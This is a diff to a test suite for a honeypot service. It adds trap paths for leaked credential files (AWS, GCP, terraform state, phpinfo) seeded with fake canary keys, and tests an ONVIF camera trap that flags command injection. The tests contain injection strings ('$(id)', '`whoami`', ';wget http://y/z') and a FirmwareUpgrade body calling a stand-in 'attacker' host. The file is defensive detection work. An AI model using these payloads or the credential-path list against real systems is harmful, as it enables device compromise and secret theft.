@@ -794,6 +794,29 @@ FAKE_TRACEBIT = {
     ("/debug/pprof/allocs", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
     ("/api/debug/pprof/heap", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
     ("/phpinfo.php", b"AKIAFAKEEXAMPLE01"),
+    # phpinfo alias additions — same render shape, AWS canary present.
+    ("/php_info.php", b"AKIAFAKEEXAMPLE01"),
+    ("/phpinfo", b"AKIAFAKEEXAMPLE01"),
+    ("/pinfo.php", b"AKIAFAKEEXAMPLE01"),
+    ("/i.php", b"AKIAFAKEEXAMPLE01"),
+    ("/pi.php", b"AKIAFAKEEXAMPLE01"),
+    # /env.* (no leading dot) — env-production render returns the
+    # same `AWS_ACCESS_KEY_ID=` shape.
+    ("/env.bak", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
+    ("/env.txt", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
+    # gcp-credentials-json alias additions — same `type: service_account` shape.
+    ("/.gcp/credentials.json", b'"type": "service_account"'),
+    ("/google-credentials.json", b'"type": "service_account"'),
+    ("/service_account.json", b'"type": "service_account"'),
+    ("/gcp-key.json", b'"type": "service_account"'),
+    # aws-credentials-file backup-rotation variants.
+    ("/.aws/credentials.bak", b"aws_access_key_id"),
+    ("/.aws/credentials.old", b"aws_access_key_id"),
+    # terraform-tfstate webroot-prefix variants.
+    ("/terraform/terraform.tfstate", b"AKIAFAKEEXAMPLE01"),
+    ("/infra/terraform.tfstate", b"AKIAFAKEEXAMPLE01"),
+    ("/infrastructure/terraform.tfstate", b"AKIAFAKEEXAMPLE01"),
+    ("/ops/terraform.tfstate", b"AKIAFAKEEXAMPLE01"),
     ("/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
     ("/.ssh/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
     ("/.ssh/id_ed25519", b"BEGIN OPENSSH PRIVATE KEY"),
@@ -1580,6 +1603,28 @@ def test_render_terraform_tfvars_json_is_valid_json():
     "/api/.env",
     "/api/.env.production",
     "/api/.env.local",
+    # /env.* (no leading dot) alias additions
+    "/env.bak",
+    "/env.txt",
+    # phpinfo alias additions (underscore + extensionless + 1-2 char variants)
+    "/php_info.php",
+    "/phpinfo",
+    "/pinfo.php",
+    "/i.php",
+    "/pi.php",
+    # gcp-credentials-json alias additions
+    "/.gcp/credentials.json",
+    "/google-credentials.json",
+    "/service_account.json",
+    "/gcp-key.json",
+    # aws-credentials-file backup-rotation variants
+    "/.aws/credentials.bak",
+    "/.aws/credentials.old",
+    # terraform-tfstate webroot-prefix variants
+    "/terraform/terraform.tfstate",
+    "/infra/terraform.tfstate",
+    "/infrastructure/terraform.tfstate",
+    "/ops/terraform.tfstate",
 ])
 def test_new_canary_trap_paths_dispatch(path):
     assert path.lower() in tbenv._TRAP_BY_PATH, (
@@ -4551,6 +4596,137 @@ async def test_dispatch_hikvision_disabled_returns_404(flux_client, monkeypatch)
     resp = await flux_client.get(
         "/SDK/webLanguage",
         headers={"X-Forwarded-For": "203.0.113.94"},
+    )
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
+
+
+# --- ONVIF device_service trap (Dahua-class IP-camera bait) ---
+
+
+def test_onvif_enabled_by_default():
+    assert tbenv.ONVIF_ENABLED
+
+
+def test_onvif_default_paths_match_observed_probes():
+    for path in (
+        "/onvif/device_service",
+        "/onvif/services",
+        "/onvif/device",
+        "/device_service",
+        # Case-insensitive — scanners mix capitalisation.
+        "/ONVIF/Device_Service",
+        "/Onvif/Device",
+    ):
+        assert tbenv.is_onvif_path(path), f"expected match: {path}"
+
+
+def test_onvif_path_non_match():
+    for path in (
+        "/",
+        "/onvif",
+        "/onvif/",
+        "/services",
+        "/onvif/snapshot",
+        "/.env",
+    ):
+        assert not tbenv.is_onvif_path(path), f"unexpected match: {path}"
+
+
+def test_onvif_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "ONVIF_ENABLED", False)
+    assert not tbenv.is_onvif_path("/onvif/device_service")
+
+
+def test_onvif_soap_action_from_body_recognises_known_actions():
+    for action in ("GetDeviceInformation", "GetSystemDateAndTime",
+                   "GetCapabilities", "GetUsers", "FirmwareUpgrade"):
+        body = f'<s:Body><tds:{action}/></s:Body>'
+        assert tbenv._onvif_soap_action_from_body(body) == action
+    assert tbenv._onvif_soap_action_from_body("") == ""
+    assert tbenv._onvif_soap_action_from_body("<random/>") == ""
+
+
+def test_onvif_has_cmdi_indicators():
+    assert tbenv._onvif_has_cmdi("<UpgradeUrl>http://x;wget http://y/z</UpgradeUrl>")
+    assert tbenv._onvif_has_cmdi("$(id)")
+    assert tbenv._onvif_has_cmdi("`whoami`")
+    assert tbenv._onvif_has_cmdi("<FirmwareUpgrade/>")
+    # GetDeviceInformation banner-grab body is not flagged.
+    assert not tbenv._onvif_has_cmdi("<s:Body><tds:GetDeviceInformation/></s:Body>")
+    assert not tbenv._onvif_has_cmdi("")
+
+
+async def test_dispatch_onvif_device_service_returns_soap_envelope(flux_client):
+    resp = await flux_client.get(
+        "/onvif/device_service",
+        headers={"X-Forwarded-For": "203.0.113.95"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "GetDeviceInformationResponse" in text
+    assert tbenv.ONVIF_MANUFACTURER in text
+    assert tbenv.ONVIF_MODEL in text
+    assert tbenv.ONVIF_FIRMWARE_VERSION in text
+    assert resp.headers.get("Content-Type", "").startswith("application/soap+xml")
+    assert resp.headers.get("Server", "").startswith("lighttpd/")
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "onvif-device-service"
+    assert entry["onvifPath"] == "/onvif/device_service"
+    assert entry["onvifMethod"] == "GET"
+    assert entry["onvifHasCmdInjection"] is False
+    assert entry["onvifSoapActionBody"] == ""
+
+
+async def test_dispatch_onvif_logs_soap_action_and_cmdi_on_post(flux_client):
+    body = (
+        b'<?xml version="1.0" encoding="UTF-8"?>\n'
+        b'<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
+        b' xmlns:tds="http://www.onvif.org/ver10/device/wsdl">\n'
+        b'<s:Body><tds:FirmwareUpgrade>'
+        b'<tds:UpgradeUrl>http://attacker/x;wget http://x/y</tds:UpgradeUrl>'
+        b'</tds:FirmwareUpgrade></s:Body></s:Envelope>'
+    )
+    resp = await flux_client.post(
+        "/onvif/device_service",
+        data=body,
+        headers={
+            "X-Forwarded-For": "203.0.113.96",
+            "Content-Type": "application/soap+xml",
+            "SOAPAction": '"http://www.onvif.org/ver10/device/wsdl/FirmwareUpgrade"',
+        },
+    )
+    assert resp.status == 200
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "onvif-device-service"
+    assert entry["onvifMethod"] == "POST"
+    assert entry["onvifSoapActionBody"] == "FirmwareUpgrade"
+    assert "FirmwareUpgrade" in entry["onvifSoapActionHeader"]
+    assert entry["onvifHasCmdInjection"] is True
+    assert "bodyPreview" in entry
+
+
+async def test_dispatch_onvif_bare_device_service_path(flux_client):
+    # Stripped banner-grab dictionaries probe /device_service with no
+    # /onvif/ prefix; same handler should respond.
+    resp = await flux_client.get(
+        "/device_service",
+        headers={"X-Forwarded-For": "203.0.113.98"},
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "onvif-device-service"
+    assert entry["onvifPath"] == "/device_service"
+
+
+async def test_dispatch_onvif_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "ONVIF_ENABLED", False)
+    resp = await flux_client.get(
+        "/onvif/device_service",
+        headers={"X-Forwarded-For": "203.0.113.97"},
     )
     assert resp.status == 404
     entries = _log_entries(flux_client.log_path)
